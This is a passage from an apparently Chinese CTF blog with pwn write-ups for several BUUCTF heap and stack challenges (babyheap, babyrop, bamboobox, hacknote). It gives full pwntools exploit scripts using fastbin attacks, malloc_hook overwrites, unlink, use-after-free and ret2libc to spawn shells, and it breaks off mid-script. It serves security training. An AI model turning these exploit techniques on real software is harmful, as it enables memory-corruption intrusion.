<li><p>我们修改chunk6的内容，即修改malloc_hook，我们用og来提权
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span> + p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br></pre></td></tr></table></figure></p></li>
<li><p>若malloc_hook不为空，再申请堆时会先调用malloc_hook处的函数，所以随便申请即可cat
flag <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">255</span>)</span><br></pre></td></tr></table></figure></p></li>
</ol>
<h3 id="完整exp">Ⅲ. 完整EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">domain_name = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port = <span class="number">25970</span></span><br><span class="line">file = <span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># io = remote(domain_name,port)</span></span><br><span class="line">io = process(file)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.recvline()</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">payload = (p64(<span class="number">0</span>)*<span class="number">3</span> +p64(<span class="number">0x21</span>))*<span class="number">2</span> + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">  </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">16</span>)[-<span class="number">8</span>:])-<span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base   ---&gt;   &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">  </span><br><span class="line">gdb.attach(io)</span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span> + p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">alloc(<span class="number">255</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="一些疑问">Ⅳ. 一些疑问</h2>
<ol type="1">
<li><p>__malloc_hook不是在data段中吗？这题开了FULL
RELRO为什么可以改啊🤔</p></li>
<li><p>第九步中heap中chunk2的Addr为什么还是40而不是80啊？</p></li>
<li><p>第十步为什么chunk4会跟topchunk合并？是哪个bin的机制？</p>
<ol type="1">
<li>unsortedbin，后向合并</li>
</ol></li>
<li><p><strong><em>为什么非要在aed处申请堆块？</em></strong></p>
<ol type="1">
<li>fastbin指针指向0xaed，说明0xaed-8是size，0xaed-0x10是prev_size，正好伪装chunk</li>
</ol></li>
</ol>
<h1 id="x02-buuctf-ogeek2019babyrop_wp">0x02 buuctf
[OGeek2019]babyrop_wp</h1>
<blockquote>
<p>网上很多wp已经不适用了，所以来更新一波XD</p>
</blockquote>
<h2 id="x00-知识点">0x00 知识点</h2>
<ol type="1">
<li>ret2libc</li>
<li>提供libc的打法</li>
<li>绕过strlen &amp; strncmp函数</li>
</ol>
<h2 id="x01-解题步骤">0x01 解题步骤</h2>
<blockquote>
<p>不贴图了，按伪代码顺序来</p>
</blockquote>
<ol type="1">
<li>fd是urandom库生成的随机数</li>
<li>将fd读4位进buf</li>
<li>将buf作为参数传进函数A，在A中称作a1</li>
<li>将a1读进s</li>
<li><strong>用户输入buf</strong>，但限制读入长度0x20，无法溢出；但可以考虑泄露</li>
<li>v1赋值为buf的长度，绕过strlen &amp; strncmp函数可以用'\x00'</li>
<li>返回buf[7]，传入函数B，在B中称作a1，是read的检测长度，如果足够长可以构造溢出
于是函数A中的read我们有思路了，即 1. 绕过strlen 2. 返回buf[7]越大越好
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line"></span><br><span class="line">io.sendline(payload)                              # Q1：为什么非得是sendline而不能是send？</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br></pre></td></tr></table></figure></li>
<li>B中观察栈的结构可知，我们可以用0xE7+4的垃圾数据抵达返回地址</li>
<li>由于string中并没有找到system('/bin/sh')，而题目提供了libc，所以我们可以泄露libc基地址；由于函数B结束后程序即将结束，我们已经没有溢出的点了，所以考虑将main作为返回地址，再来提供一次溢出，所以考虑构造payload2：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxxxxx</span><br><span class="line">xxxxxx&lt;-----垃圾数据</span><br><span class="line">puts_plt&lt;---调用puts</span><br><span class="line">main_addr&lt;--将puts的返回地址压栈，即将eip的下一条指令压栈</span><br><span class="line">puts_got&lt;---将puts的参数弹给puts</span><br><span class="line"></span><br><span class="line">junk     =  0xE7 + 4</span><br><span class="line"></span><br><span class="line"># payload  =  b&#x27;a&#x27;*junk + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)</span><br><span class="line"></span><br><span class="line">payload  =  b&#x27;a&#x27;*junk + p32(puts_plt) + p32(main_addr) + p32(puts_got)      # Q2: puts为什么不会打印后面的内容了？为什么puts_got后面一定是可以被转换为0a的00？</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr =  u32(io.recv(4))</span><br><span class="line"></span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"></span><br><span class="line"># 注1：puts(const char* arg1)一直打印，直到遇到&#x27;\0&#x27;，丢弃&#x27;\0&#x27;并输出&#x27;\n&#x27;</span><br><span class="line"># 注2：sszie_t write(fd,const char* src,length) (fd=1,length=32/8 or 64/8)</span><br></pre></td></tr></table></figure></li>
<li>泄露libc地址后，泄露<code>system</code>和<code>/bin/sh</code>的地址
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">offset   = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">sys_addr = offset + libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">bin_sh   = offset + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br></pre></td></tr></table></figure></li>
<li>再进行一次绕过strncmp <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br></pre></td></tr></table></figure></li>
<li>最后提权 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload  =  b&#x27;a&#x27;* junk + p32(sys_addr) + p32(0) + p32(bin_sh)    # 细节2：覆盖返回地址时，32位需要在栈上补充返回地址</span><br><span class="line">                                                                 # Q3：为什么？</span><br><span class="line">io.send(payload)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
<li>最后贴一下全部exp <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">io = remote(&#x27;node4.buuoj.cn&#x27;,26218)</span><br><span class="line"># context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">  </span><br><span class="line">puts_got =elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt =elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_addr = 0x08048825</span><br><span class="line">  </span><br><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br><span class="line">  </span><br><span class="line">junk     =  0xE7 + 4</span><br><span class="line">payload  =  b&#x27;a&#x27;*junk + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">puts_addr =  u32(io.recv(4))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line">  </span><br><span class="line">offset   = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">sys_addr = offset + libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh   = offset + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">payload  =  &#x27;\x00&#x27; + &#x27;\xff&#x27; * 7</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(b&quot;Correct\n&quot;)</span><br><span class="line">  </span><br><span class="line">payload  =  b&#x27;a&#x27;* junk + p32(sys_addr) + p32(0) + p32(bin_sh)</span><br><span class="line">io.send(payload)</span><br><span class="line">  </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="x02-一些思考">0x02 一些思考</h2>
<ol type="1">
<li>本题还可以有以下几种打法
<ol type="1">
<li>泄露地址方面：不仅可以用puts，还可以用write；讲道理一切能输出到终端的函数都可以利用来泄露内容，后续慢慢探索</li>
<li>泄露地址后，我们可以用og进行提权</li>
</ol></li>
<li>一些工具的使用
<ol type="1">
<li>flat可以用来构造payload</li>
</ol></li>
</ol>
<h2 id="x03-一些问题">0x03 一些问题</h2>
<ol type="1">
<li>0x01
中第七步payload，为什么在send时只能是sendline，我看received的结果明明都一样啊</li>
<li>0x01
中第九步payload，puts为什么不会打印后面的内容了（代码底部'注2'）？为什么puts_got后面一定是可以被转换为0a的00？</li>
<li>0x01 中第12步payload，为什么需要sys_addr + 0 +
bin_sh，这个0是sys_addr的返回地址吗？</li>
<li>网上很多博客都用LibcSearcher，可是我在将LibcSearcher数据库更新到最新版本以后还是无法查到对应libc库，很奇怪</li>
</ol>
<h1 id="x03-buuctf-hitcontraining_bamboobox">0x03 buuctf
hitcontraining_bamboobox</h1>
<h2 id="poc">POC</h2>
<p>这题看反汇编代码有个 magic，应该用 House of Force，但是 buu 喜欢把
flag 放在 / 目录下，所以题目提供的 magic 函数就失效了</p>
<p>所以用 unlink 修改堆表，使我们可以实现任意地址写</p>
<h2 id="exp">exp</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;node5.buuoj.cn:28090&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./bamboobox&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def show():</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def alloc(size, content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;item name:&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;name of item:&#x27;, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def edit(idx, size, content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;index of item:&#x27;, str(idx))</span><br><span class="line">  io.sendlineafter(&#x27;length of item name:&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;name of the item:&#x27;, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(4))</span><br><span class="line">  io.sendlineafter(&#x27;index of item:&#x27;, str(idx))</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">alloc(0x40,&#x27;a&#x27;*8 )         # 0</span><br><span class="line">alloc(0x80,&#x27;b&#x27; * 8)        # 1</span><br><span class="line">alloc(0x80,&#x27;c&#x27; * 8)        # 2</span><br><span class="line">alloc(0x20,&#x27;/bin/sh\x00\x00\x00\x00&#x27;)  # 3</span><br><span class="line"></span><br><span class="line">ptr=0x6020c8</span><br><span class="line">fd=ptr-0x18</span><br><span class="line">bk=ptr-0x10</span><br><span class="line"></span><br><span class="line">fake_chunk=p64(0)</span><br><span class="line">fake_chunk+=p64(0x41)</span><br><span class="line">fake_chunk+=p64(fd)</span><br><span class="line">fake_chunk+=p64(bk)</span><br><span class="line">fake_chunk+=b&#x27;\x00&#x27;*0x20</span><br><span class="line">fake_chunk+=p64(0x40)</span><br><span class="line">fake_chunk+=p64(0x90)</span><br><span class="line"></span><br><span class="line">edit(0,len(fake_chunk),fake_chunk)</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line">free_got=elf.got[&#x27;free&#x27;]</span><br><span class="line">payload1=p64(0)+p64(0)+p64(0x30)+p64(free_got)</span><br><span class="line"></span><br><span class="line">edit(0,len(payload1),payload1)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">free_addr=u64(io.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8,b&#x27;\x00&#x27;)) </span><br><span class="line">libc=LibcSearcher(&#x27;free&#x27;,free_addr)</span><br><span class="line">libc_base=free_addr-libc.dump(&#x27;free&#x27;)</span><br><span class="line">sys_addr=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">print(&#x27;free_addr   ---&gt;   &#x27;,hex(free_addr))</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr   ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line">edit(0,0x8,p64(sys_addr))</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="x04-hitcontraining_uaf">0x04 hitcontraining_uaf</h1>
<p>Ⅰ. 所用知识点：<br />
1. 逆向分析（这个题逆向太坐牢了，pseudocode太恶心，只能一点一点看） 2.
利用fastbin性质实现 3. UAF</p>
<p>Ⅱ. EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25676</span><br><span class="line">file = &#x27;./hacknote&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./hacknote&#x27;)</span><br><span class="line"># libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;size :&#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content :&#x27;,content)</span><br><span class="line">  </span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def print(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">alloc(0x10,&#x27;aaaa&#x27;)</span><br><span class="line">alloc(0x10,&#x27;aaaa&#x27;)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">get_shell = 0x8048945</span><br><span class="line">alloc(0x8,p32(get_shell))</span><br><span class="line">print(0)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<p>Ⅲ. 解题感言
这个题该说是出的很灵活还是很逆天...想要发现利用点需要比较扎实的逆向功底才行。其次还要对fastbin对于不同大小的chunk的分配问题有比较深入的了解。</p>
<h1 id="x05-hitcontraining_magicheap">0x05 hitcontraining_magicheap</h1>
<p>Ⅰ. 所用知识点<br />
1. 利用fastbin的FFSL进行任意地址写</p>
<p>Ⅱ. EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 29259</span><br><span class="line">file = &#x27;./magicheap&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./magicheap&#x27;)</span><br><span class="line"># libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Heap : &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;heap:&#x27;,content)</span><br><span class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Heap : &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;heap : &#x27;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">fake_chunk = 0x60208d</span><br><span class="line">alloc(0x10,&#x27;\x00&#x27;)</span><br><span class="line">alloc(0x60,&#x27;\x00&#x27;)</span><br><span class="line">alloc(0x40,&#x27;\x00&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">payload = p64(0)*3 + p64(0x71) + p64(fake_chunk)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">alloc(0x60,&#x27;aaaa&#x27;)</span><br><span class="line">alloc(0x60,&#x27;aaaaaaaa&#x27;)</span><br><span class="line">io.sendline(str(4869))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"> </span><br></pre></td></tr></table></figure></p>
<p>Ⅲ. 解题感言<br />
四道堆题了，这是第一道自己做出来的堆题<br />
我做Pwn的整体习惯是边打边学，没有说是先学再打<br />
这道题整体感觉跟[ZJCTF
2019]EasyHeap非常像，不过133t函数里藏的是真flag，不用去泄露libc地址劫持malloc_hook了<br />
因为特别像所以就考虑用fastbin
attack打，事实上我到现在也不太清楚这算不算fastbin attack<br />
只是利用了堆溢出和从fastbin里申请chunk的特性进行了一个任意地址的写<br />
解决了babyheap那道题里不清楚的一个点(为什么在0x..aed申请fake_chunk)<br />
这道题网上还有unsortedbin attack，抽空学一下</p>
<h1 id="x06-ciscn_2019_n_3">0x06 ciscn_2019_n_3</h1>
<p>Ⅰ. 所用知识点<br />
1. UAF</p>
<p>Ⅱ. EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 26279</span><br><span class="line">file = &#x27;./ciscn_2019_n_3&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./ciscn_2019_n_3&#x27;)</span><br><span class="line"># libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(index,content):</span><br><span class="line">  io.sendlineafter(&#x27;CNote &gt; &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Index &gt; &#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Type &gt; &#x27; , str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Value &gt; &#x27;, content)</span><br><span class="line"></span><br><span class="line">def alloc(index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;CNote &gt; &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Index &gt; &#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Type &gt; &#x27; , str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Length &gt; &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Value &gt; &#x27;, content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;CNote &gt; &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index &gt; &#x27;, str(index))</span><br><span class="line"></span><br><span class="line">def dump(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index &gt; &#x27;, str(index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">alloc(0,0x10,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">alloc(1,0x10,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">sys_plt = elf.plt[&#x27;system&#x27;]</span><br><span class="line">payload = b&#x27;bash&#x27;+p32(sys_plt)</span><br><span class="line">alloc(2,0xc,payload)</span><br><span class="line">delete(1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<p>Ⅲ.解题感言<br />
第二道自己做的heap，总体感觉前两页的heap都属于签到</p>
<h1 id="x07-babyfengshui_33c3_2016">0x07 babyfengshui_33c3_2016</h1>
<p>Ⅰ. 所用知识 1. 逆向分析：奇葩的堆溢出检测方式</p>
<p>Ⅱ.完整EXP <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 28267</span><br><span class="line">file = &#x27;./babyfengshui_33c3_2016&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./babyfengshui_33c3_2016&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ----------------------------------------------------------</span><br><span class="line">def alloc(hsize,name,wsize,desc):</span><br><span class="line">  io.sendlineafter(&#x27;Action: &#x27;, str(0))</span><br><span class="line">  io.sendlineafter(&#x27;description: &#x27;, str(hsize))</span><br><span class="line">  io.sendlineafter(&#x27;name: &#x27; , name)</span><br><span class="line">  io.sendlineafter(&#x27;length: &#x27;, str(wsize))</span><br><span class="line">  io.sendlineafter(&#x27;text: &#x27;,desc)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;Action: &#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line"></span><br><span class="line">def dump(index):</span><br><span class="line">  io.sendlineafter(&#x27;Action: &#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line">  </span><br><span class="line">def edit(index,wsize,desc):</span><br><span class="line">  io.sendlineafter(&#x27;Action: &#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;index: &#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;length: &#x27;, str(wsize))</span><br><span class="line">  io.sendlineafter(&#x27;text: &#x27;,desc)</span><br><span class="line"># ----------------------------------------------------------</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line"></span><br><span class="line">alloc(0x80,&#x27;aaaa&#x27;,0x80,&#x27;bbbb&#x27;)</span><br><span class="line">alloc(0x80,&#x27;aaaa&#x27;,0x80,&#x27;bbbb&#x27;)</span><br><span class="line">alloc(0x8,&#x27;aaaa&#x27;,0x8,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">delete(0)</span><br><span 